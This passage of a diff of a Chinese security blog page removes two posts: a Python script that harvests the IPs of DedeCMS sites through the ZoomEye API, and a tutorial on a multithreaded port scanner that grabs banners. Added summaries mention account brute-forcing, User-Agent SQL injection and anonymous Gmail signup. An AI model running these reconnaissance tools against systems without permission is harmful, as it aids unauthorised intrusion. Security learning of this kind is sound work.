anka9080</span></span><br><span class="line"><span class="comment"># datetime: 20160330</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line">access_token = <span class="string">''</span></span><br><span class="line">ip_list = []</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span><br><span class="line">        输入用户米密码 进行登录操作</span><br><span class="line">    :return: 访问口令 access_token</span><br><span class="line">    """</span></span><br><span class="line">    user = raw_input(<span class="string">'[-] input : username :'</span>)</span><br><span class="line">    passwd = raw_input(<span class="string">'[-] input : password :'</span>)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span> : user,</span><br><span class="line">        <span class="string">'password'</span> : passwd</span><br><span class="line">    &#125;</span><br><span class="line">    data_encoded = json.dumps(data)  <span class="comment"># dumps 将 python 对象转换成 json 字符串</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url = <span class="string">'http://api.zoomeye.org/user/login'</span>,data = data_encoded)</span><br><span class="line">        r_decoded = json.loads(r.text) <span class="comment"># loads() 将 json 字符串转换成 python 对象</span></span><br><span class="line">        <span class="keyword">global</span> access_token</span><br><span class="line">        access_token = r_decoded[<span class="string">'access_token'</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[-] info : username or password is wrong, please try again '</span></span><br><span class="line">        exit()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveStrToFile</span><span class="params">(file,str)</span>:</span></span><br><span class="line">    <span class="string">"""</span><br><span class="line">        将字符串写如文件中</span><br><span class="line">    :return:</span><br><span class="line">    """</span></span><br><span class="line">    <span class="keyword">with</span> open(file,<span class="string">'w'</span>) <span class="keyword">as</span> output:</span><br><span class="line">        output.write(str)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveListToFile</span><span class="params">(file,list)</span>:</span></span><br><span class="line">    <span class="string">"""</span><br><span class="line">        将列表逐行写如文件中</span><br><span class="line">    :return:</span><br><span class="line">    """</span></span><br><span class="line">    s = <span class="string">'\n'</span>.join(list)</span><br><span class="line">    <span class="keyword">with</span> open(file,<span class="string">'w'</span>) <span class="keyword">as</span> output:</span><br><span class="line">        output.write(s)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apiTest</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span><br><span class="line">        进行 api 使用测试</span><br><span class="line">    :return:</span><br><span class="line">    """</span></span><br><span class="line">    page = <span class="number">1</span></span><br><span class="line">    <span class="keyword">global</span> access_token</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'access_token.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> input:</span><br><span class="line">        access_token = input.read()</span><br><span class="line">    <span class="comment"># 将 token 格式化并添加到 HTTP Header 中</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Authorization'</span> : <span class="string">'JWT '</span> + access_token,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print headers</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">             </span><br><span class="line">            r = requests.get(url = <span class="string">'http://api.zoomeye.org/host/search?query="dedecms"&amp;facet=app,os&amp;page='</span> + str(page),</span><br><span class="line">                         headers = headers)</span><br><span class="line">            r_decoded = json.loads(r.text)</span><br><span class="line">            <span class="comment"># print r_decoded</span></span><br><span class="line">            <span class="comment"># print r_decoded['total']</span></span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> r_decoded[<span class="string">'matches'</span>]:</span><br><span class="line">                <span class="keyword">print</span> x[<span class="string">'ip'</span>]</span><br><span class="line">                ip_list.append(x[<span class="string">'ip'</span>])</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[-] info : count '</span> + str(page * <span class="number">10</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            <span class="comment"># 若搜索请求超过 API 允许的最大条目限制 或者 全部搜索结束，则终止请求</span></span><br><span class="line">            <span class="keyword">if</span> str(e.message) == <span class="string">'matches'</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] info : account was break, excceeding the max limitations'</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span>  <span class="string">'[-] info : '</span> + str(e.message)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> page == <span class="number">10</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            page += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 访问口令文件不存在则进行登录操作</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(<span class="string">'access_token.txt'</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[-] info : access_token file is not exist, please login'</span></span><br><span class="line">        login()</span><br><span class="line">        saveStrToFile(<span class="string">'access_token.txt'</span>,access_token)</span><br><span class="line"> </span><br><span class="line">    apiTest()</span><br><span class="line">    saveListToFile(<span class="string">'ip_list.txt'</span>,ip_list)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-运行测试"><a href="#0x03-运行测试" class="headerlink" title="0x03 运行测试"></a>0x03 运行测试</h2><p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160330160700113-1074709220.png" alt=""></p>
-<p>打开 access_token.txt 文件：</p>
-<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160330160826551-1914843565.png" alt=""></p>
-<p>打开 ip_list.txt 文件：</p>
-<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160330160907894-1222152171.png" alt=""></p>
-<p>题外话： 使用 Firefox 的 Modify Headers 添加上 Authentication 这个 头信息后在浏览器里可以</p>
-<p>直接看到返回的 JSON 字符串结果，如下 </p>
-<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160330161207316-1843049358.png" alt=""></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+    <a href="/2016/08/21/匿名注册Google邮箱/" title="匿名注注册Google邮箱" itemprop="url">
   
-  <span></span> <a href="/tags/Python/">Python</a><a href="/tags/ZoomEye/">ZoomEye</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/03/30/zoomeye-api/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/03/30/zoomeye-api/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
+    <h1 itemprop="name">匿名注注册Google邮箱</h1>
     
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
+     
+           <p itemprop="description" >不需要邮箱验证，不需要手机验证
+
+注意： 需要先连接香港的VPN服务器，日本的Vultr 测试失败 
+
+从 www.gmail.com 入口，点击注册。
+
+姓氏要手打。（No老师说的）
+
+电话区域的区号选择 特克斯和凯科斯群岛 (Turks &amp;amp; Caicos Island</p>
+        
     
-      <a href="/2016/03/09/python-multithread-ports-scanner/" title="多线程端口扫描器的 Python 脚本" itemprop="url">多线程端口扫描器的 Python 脚本</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-03-09T09:26:32.000Z" itemprop="datePublished"> Published 2016-03-09</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="0x-00-Before-Coding"><a href="#0x-00-Before-Coding" class="headerlink" title="0x 00 Before Coding"></a>0x 00 Before Coding</h2><p>当端口打开时，向端口发送 TCP SYN 请求，会返回一个 ACK 响应:</p>
-<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160309164525663-1708465423.png" alt=""></p>
-<p>当端口关闭，返回的是 RST 响应：</p>
-<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160309164613975-859417226.png" alt=""></p>
-<h2 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h2><p>可以用 socket 编写一个小脚本来测试主机端口的开启情况，基本代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment">#author: anka9080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set time-out to get the scanning fast</span></span><br><span class="line">socket.setdefaulttimeout(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ask for input</span></span><br><span class="line">remote_server = raw_input(<span class="string">"Enter a remote host to scan:"</span>)</span><br><span class="line">remote_server_ip = socket.gethostbyname(remote_server)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print a nice banner with info on which host we are about to scan</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">60</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Please wait, scanning remote host '</span>, remote_server_ip</span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check what time the scan started</span></span><br><span class="line">t1 = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using the range function to specify ports(1 - 1024)</span></span><br><span class="line"><span class="comment"># We also put in some error handling for catching errors</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1025</span>):</span><br><span class="line">        sock = socket.socket(<span class="number">2</span>,<span class="number">1</span>) <span class="comment"># 2:socket.AF_INET 1:socket.SOCK_STREAM</span></span><br><span class="line">        res = sock.connect_ex((remote_server_ip,port))</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Port &#123;&#125;: OPEN'</span>.format(port)</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> socket.gaierror:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Hostname could not be resolved.Exiting'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could't connect to the server"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check the time now</span></span><br><span class="line">t2 = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculates the difference of time</span></span><br><span class="line">total = t2 - t1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the info to screen</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Scanning Completed in: '</span>, total</span><br></pre></td></tr></table></figure>
-<p>程序测试结果如下：</p>
-<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160309165331772-1919340199.png" alt=""></p>
-<p>看出来 在 socket 的超时时间设置为0.5的前提下 依然需要花费 8分27秒才能够把周知端口号扫完，有没有其他方式加快扫描速度？答案是有的。</p>
-<blockquote>
-<p>// <strong><strong><strong><strong><em>**</em></strong></strong></strong></strong> 该部分可以略过，本人踩到的一个小坑 </p>
-</blockquote>
-<p>　　打开 抓到的数据包列表，发现 timeout 包都会发送2个“伪重传”，发送这两个一般没什么用的数据包会占用 CPU的处理时间，</p>
-<p>　　所以在想能不能不让程序发这两个包来提高效率？？</p>
-<p>　　自己分析连续两个端口的时间间隔就会发现：间隔是0.5s（由 39号、46号、53号数据包分析得出），这恰好是在程序中设置的超时时间，</p>
-<p>　　也就是说超时重传的包并不会占用专门的时间，所以这种想法就被干掉了。</p>
-<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160309171312835-1560836350.png" alt=""></p>
-<p>　　这样的话，1个端口0.5的超时等待，扫描一个主机的 1- 1024 号端口所用时间是可以大致估算下的：</p>
-<p>　　1024 * 0.5 / 60 = 8.53 分钟左右。和上面程序实际扫描的时间（8分27秒）相符合。</p>
-<blockquote>
-<p>// 越过坑 ：P <strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></p>
-</blockquote>
-<h2 id="0x-02-Better-Coding"><a href="#0x-02-Better-Coding" class="headerlink" title="0x 02 Better Coding"></a>0x 02 Better Coding</h2><p>所以对于这种时间主要花费在 socket 连接( 非 CPU 计算密集型 )的程序 可以使用 多线程来提升效率，</p>
-<p>这里选择使用内建的库 multiprocessing.dummy 来实现多线程扫描：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># proj: 多线程 Socket TCP 端口扫描器</span></span><br><span class="line"><span class="comment"># author: anka9080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"> </span><br><span class="line">remote_server = raw_input(<span class="string">"Enter a remote host to scan:"</span>)</span><br><span class="line">remote_server_ip = socket.gethostbyname(remote_server)</span><br><span class="line">ports = []</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">60</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Please wait, scanning remote host '</span>, remote_server_ip</span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">60</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">socket.setdefaulttimeout(<span class="number">0.5</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_port</span><span class="params">(port)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">        res = s.connect_ex((remote_server_ip,port))</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">0</span>: <span class="comment"># 如果端口开启 发送 hello 获取banner</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Port &#123;&#125;: OPEN'</span>.format(port)</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">print</span> str(e.message)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1025</span>):</span><br><span class="line">    ports.append(i)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Check what time the scan started</span></span><br><span class="line">t1 = datetime.now()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">pool = ThreadPool(processes = <span class="number">8</span>)</span><br><span class="line">results = pool.map(scan_port,ports)</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">'Multiprocess Scanning Completed in  '</span>, datetime.now() - t1</span><br></pre></td></tr></table></figure>
-<p>　扫描的结果如下：</p>
-<p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160309175531991-613764362.png" alt=""></p>
-<p>　　可以发现 8 个线程并行发起请求，效率有很大的提升。</p>
-<p>　　在被扫描主机未安装连接限制软件的前提下，测试了开启不同线程扫描所花费的时间 ：</p>
-<ul>
-<li>　　16 个线程 使用 32 秒扫完；</li>
-<li>　　32个线程，使用 16 秒扫完；</li>
-<li>　　64个线程，使用 8 秒扫完；</li>
-<li>　　128个线程，使用 4 秒扫完；</li>
-<li>　　256个线程，使用 2 秒扫完；</li>
-<li>　　512个线程，使用 1.50 秒扫完；</li>
-<li>　　1024个线程，使用 1.25 秒扫完；</li>
-</ul>
-<p><strong>至于开多少线程合适要自己来 fuzzing ， 不要以为开的线程越多越好，因为线程的创建，线程之间的切换也是要消耗资源的。</strong></p>
-<p>要获取 Banner 的话，把核心函数修改成如下即可：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_port</span><span class="params">(port)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">        res = s.connect_ex((remote_server_ip,port))</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">0</span>: <span class="comment"># 如果端口开启 发送 hello 获取banner</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s.send(<span class="string">'hello'</span>)</span><br><span class="line">                banner = s.recv(<span class="number">1024</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Port &#123;&#125;: OPEN'</span>.format(port)</span><br><span class="line">                <span class="keyword">print</span> str(e.message)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Port &#123;&#125;: OPEN'</span>.format(port)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Banner &#123;&#125;'</span>.format(banner)</span><br><span class="line"> </span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">print</span> str(e.message)</span><br></pre></td></tr></table></figure>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
+    <time datetime="2016-08-21T05:26:33.000Z" itemprop="datePublished">2016-08-21</time>
+  </a>
+</section>
 
 
-  <div class="article-tags">
+
+
+
+
   
-  <span></span> <a href="/tags/端口扫描/">端口扫描</a><a href="/tags/Python/">Python</a><a href="/tags/多线程/">多线程</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/03/09/python-multithread-ports-scanner/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/03/09/python-multithread-ports-scanner/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2016/07/25/python模拟登录并保持cookie/" title="python模拟登录并保持cookie" itemprop="url">
+  
+    <h1 itemprop="name">python模拟登录并保持cookie</h1>
+    
+     
+           <p itemprop="description" >前言最近在爬行 nosec.org 的数据，看了下需要模拟登录拿到cookie后才能访问想抓的数据，重要的是 nosec.org 的登录页面 form 中有个 authenticity_token 字段每次访问登录页面都会自动生成，而且会和你的用户名，密码一样被POST到服务器。</p>
+        
+    
+    <time datetime="2016-07-24T17:03:49.000Z" itemprop="datePublished">2016-07-25</time>
+  </a>
+</section>
 
 
 
 
 
 
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2016/07/10/近期更新的-Github-Python-脚本/" title="近期更新的 Github Python 脚本" itemprop="url">
+  
+    <h1 itemprop="name">近期更新的 Github Python 脚本</h1>
+    
+     
+           <p itemprop="description" >注： 所有脚本经过本地测试运行 OK。
+地址： https://github.com/Evi1CLAY/CoolPool
 
-  <nav id="page-nav" class="clearfix">
+TUST爆破相关脚本
+
+包含三个脚本：模拟登陆，批量爆破账号密码相同的账户，查找使用指定密码的用户
+
+ZoomEyeApiDemo
+
+ZoomEyeApi </p>
+        
+    
+    <time datetime="2016-07-09T16:12:47.000Z" itemprop="datePublished">2016-07-10</time>
+  </a>
+</section>
+
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2016/05/27/wooyun-spider/" title="爬取 WooYun 论坛所有漏洞条目的相关信息" itemprop="url">
+  
+    <h1 itemprop="name">爬取 WooYun 论坛所有漏洞条目的相关信息</h1>
+    
+     
+           <p itemprop="description" >每个漏洞条目包含：
+乌云ID，漏洞标题，漏洞所属厂商，白帽子，漏洞类型，厂商或平台给的Rank值
+主要是做数据分析使用：可以分析某厂商的各类型漏洞的统计；或者对白帽子的能力进行分析…..
+数据更新时间：2016/5/27漏洞条目：104796条
+数据截图如下：
+
+数据网盘链接：
+</p>
+        
+    
+    <time datetime="2016-05-27T10:24:16.000Z" itemprop="datePublished">2016-05-27</time>
+  </a>
+</section>
+
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2016/05/26/ua-sql-injection/" title="User-Agent 手工注入的探测与利用分析" itemprop="url">
+  
+    <h1 itemprop="name">User-Agent 手工注入的探测与利用分析</h1>
+    
+     
+           <p itemprop="description" >原理很简单：后台在接收UA时没有对UA做过滤，也没有PDO进行数据交互（实际PDO是非常有必要的），导致UA中有恶意代码，最终在数据库中执行。 
+0x00 Bug 代码：本地顺手打了一个环境，Bug 代码部分：
+123456789// 保存到访者的IP信息$db=DBConnec</p>
+        
+    
+    <time datetime="2016-05-26T10:15:23.000Z" itemprop="datePublished">2016-05-26</time>
+  </a>
+</section>
+
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2016/05/24/python-multithreads-templete/" title="Python ThreadPool 线程池模板" itemprop="url">
+  
+    <h1 itemprop="name">Python ThreadPool 线程池模板</h1>
+    
+     
+           <p itemprop="description" >0x 00 Why　　Python 的 简单多线程实现 用 dummy 模块 一句话就可以搞定，但需要对线程，队列做进一步的操作，最好自己写个线程池类来实现，考虑到后期会经常使用，所以把模板贴出来。
+0x 01 Coding1234567891011121314151617181</p>
+        
+    
+    <time datetime="2016-05-24T10:11:29.000Z" itemprop="datePublished">2016-05-24</time>
+  </a>
+</section>
+
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2016/03/30/zoomeye-api/" title="Python 调用 ZoomEye API 批量获取目标网站IP" itemprop="url">
+  
+    <h1 itemprop="name">Python 调用 ZoomEye API 批量获取目标网站IP</h1>
+    
+     
+           <p itemprop="description" >0x 00 前言　　ZoomEye 的 API 在前几天正式对外部开发，这对网络渗透人员来说是一件开心的事
+　　可以说“妈妈再也不用担心批量测(x)试(zhan)没有资源了。”
+　　官方的 API 帮助文档在下面：
+　　https://www.zoomeye.org/api/
+　</p>
+        
+    
+    <time datetime="2016-03-30T10:03:39.000Z" itemprop="datePublished">2016-03-30</time>
+  </a>
+</section>
+
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/2016/03/09/python-multithread-ports-scanner/" title="多线程端口扫描器的 Python 脚本" itemprop="url">
+  
+    <h1 itemprop="name">多线程端口扫描器的 Python 脚本</h1>
+    
+     
+           <p itemprop="description" >0x 00 Before Coding当端口打开时，向端口发送 TCP SYN 请求，会返回一个 ACK 响应:
+
+当端口关闭，返回的是 RST 响应：
+
+Coding可以用 socket 编写一个小脚本来测试主机端口的开启情况，基本代码如下：
+12345678910111213</p>
+        
+    
+    <time datetime="2016-03-09T09:26:32.000Z" itemprop="datePublished">2016-03-09</time>
+  </a>
+</section>
+
+
+
+
+
+
+
+  <nav id="page-nav" class="clearfix unexpand">
     <a class="extend prev" rel="prev" href="/"><span></span>Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next<span></span></a>
   </nav>
 
 </div>
-      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
 
 <div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
 <aside class="clearfix">
 
   
 
   
 <div class="tagslist">
-	<p class="asidetitle">Tags</p>
+	<p class="asidetitle">标签</p>
 		<ul class="clearfix">
 		
 			
@@ -1048,7 +430,7 @@ $stmt-&gt;execute();
 
 
   <div class="linkslist">
-  <p class="asidetitle">Links</p>
+  <p class="asidetitle">友情链接</p>
     <ul>
         
           <li>
@@ -1072,11 +454,8 @@ $stmt-&gt;execute();
     </ul>
 </div>
 
-  
-
-
   <div class="rsspart">
-	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
 </div>
 
 </aside>
@@ -1216,7 +595,7 @@ $(document).ready(function(){
 <!-- Totop Begin -->
 
 	<div id="totop">
-	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 	</div>
 	<script src="/js/totop.js"></script>
 
